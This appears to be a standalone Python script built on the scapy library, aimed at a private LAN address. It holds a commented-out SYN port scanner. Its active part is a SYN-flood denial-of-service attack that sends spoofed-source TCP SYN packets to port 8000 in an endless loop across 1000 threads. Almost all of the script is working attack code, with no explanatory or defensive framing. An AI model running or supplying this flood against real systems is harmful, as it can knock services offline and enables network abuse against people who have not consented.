from scapy.all import *
from scapy.layers.inet import TCP, IP
import random
import threading
import time
from socket import *
ports = []
all_threads =[]
ip = "192.168.1.44"

def check_port_available(port):
    new_seq = random.randint(0, 3253)
    syn_segment = TCP(dport=port, seq=new_seq, flags='S')
    syn_packet = IP(dst=ip) / syn_segment
    syn_ack_packet = sr1(syn_packet, timeout=1)
    if syn_ack_packet != None:
        ack_packet = TCP(dport=port, ack=syn_ack_packet.ack + 1, seq=syn_ack_packet.seq, flags='A')
        sr1(IP(dst=ip) / ack_packet).show()
        ports.append(port)

def ip_attack():
    while True:
        syn_segment = TCP(sport=random.randint(1,65535), dport=8000, flags='S', seq= 1000, window=random.randint(1000,9000))
        place1 = str(random.randint(0, 255))
        place2 = str(random.randint(0, 255))
        place3 = str(random.randint(0, 255))
        place4 = str(random.randint(0, 255))
        ip1 = place1 + "." + place2 + "." + place3 + "." + place4
        syn_packet = IP(dst=ip, src=ip1) / syn_segment
        send(syn_packet)

def ip_attack1():
    s = socket(AF_INET,SOCK_STREAM)
    s.connect((ip,8000))



#for i in range(4800, 5001):
#    thread = threading.Thread(target=check_port_available, args=(i,)).start()
#    all_threads.append(thread)


#time.sleep(5)
#print(ports)


for i in range(0, 1000):
    thread = threading.Thread(target=ip_attack)
    all_threads.append(thread)
    print("Create new ip address attack")

for thread in all_threads:
    thread.start()